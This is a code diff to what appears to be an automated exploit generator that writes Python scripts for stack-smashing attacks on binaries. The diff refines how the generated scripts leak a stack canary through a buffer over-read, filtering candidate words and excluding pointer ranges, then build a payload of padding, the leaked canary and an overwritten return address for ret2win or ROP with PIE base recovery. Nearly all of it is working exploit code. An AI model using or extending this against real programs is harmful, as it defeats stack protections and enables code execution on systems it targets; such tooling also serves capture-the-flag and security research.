@@ -346,9 +346,16 @@ def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, 
         "    p.stdin.write(TRIGGER); p.stdin.flush()\n"
         "    dump=read_until(p, time.time()+3)\n"
         "    vals=[int(m.group(0),16) for m in re.finditer(REGEX.encode(),dump)]\n"
-        # A buffer OVER-READ leaks the canary as a RAW little-endian word (no hex text), so harvest
-        # 8-byte words too; find_canary picks the high-entropy, low-byte-0 one that is not a pointer.
-        "    vals += [int.from_bytes(dump[i:i+8],'little') for i in range(max(0,len(dump)-7))]\n"
+        # A buffer OVER-READ leaks the canary as a RAW little-endian word (no hex text): harvest
+        # CANARY-SHAPED words -- low byte 0x00, byte 1 non-zero, >=5 non-zero bytes (high entropy),
+        # not a pointer. A naive every-8-bytes harvest hands find_canary a mostly-zero garbage word
+        # it wrongly accepts, so the write-back trips __stack_chk_fail (`*** stack smashing`).\n"
+        "    for i in range(max(0,len(dump)-7)):\n"
+        "        wb=dump[i:i+8]\n"
+        "        if wb[0]!=0 or wb[1]==0 or sum(1 for x in wb if x)<5: continue\n"
+        "        w=int.from_bytes(wb,'little')\n"
+        "        if 0x550000000000<=w<=0x5FFFFFFFFFFF or 0x7F0000000000<=w<=0x7FFFFFFFFFFF: continue\n"
+        "        vals.append(w)\n"
         "    canary = vals[IDX] if (IDX is not None and -len(vals)<=IDX<len(vals)) else find_canary(vals)\n"
         "    if canary is None: p.kill(); continue\n"
         "    pre=prefix(canary)\n"
@@ -1498,7 +1505,15 @@ def render_canary_ret2win_script(*, repro, target_bytes=b"", image_anchors=None)
         "    if TRIGGER: p.stdin.write(TRIGGER); p.stdin.flush()\n"
         "    dump = read_until(p, time.time() + 3)\n"
         "    vals = [int(m.group(0), 16) for m in re.finditer(REGEX.encode(), dump)]\n"
-        "    canary = vals[IDX] if (IDX is not None and -len(vals) <= IDX < len(vals)) else find_canary(vals)\n"
+        # a raw over-read leaks the canary as a canary-shaped binary word (not hex); harvest those
+        "    cvals = []\n"
+        "    for i in range(max(0, len(dump) - 7)):\n"
+        "        wb = dump[i:i+8]\n"
+        "        if wb[0] != 0 or wb[1] == 0 or sum(1 for x in wb if x) < 5: continue\n"
+        "        w = int.from_bytes(wb, 'little')\n"
+        "        if not (0x550000000000 <= w <= 0x5FFFFFFFFFFF or 0x7F0000000000 <= w <= 0x7FFFFFFFFFFF):\n"
+        "            cvals.append(w)\n"
+        "    canary = vals[IDX] if (IDX is not None and -len(vals) <= IDX < len(vals)) else find_canary(vals + cvals)\n"
         "    base = pie_base(vals) if PIE else 0\n"
         "    if canary is None or (PIE and not base): p.kill(); continue\n"
         "    pre = b'A'*CANARY_OFF + q(canary) + b'B'*max(0, RET_OFF - CANARY_OFF - 8)\n"
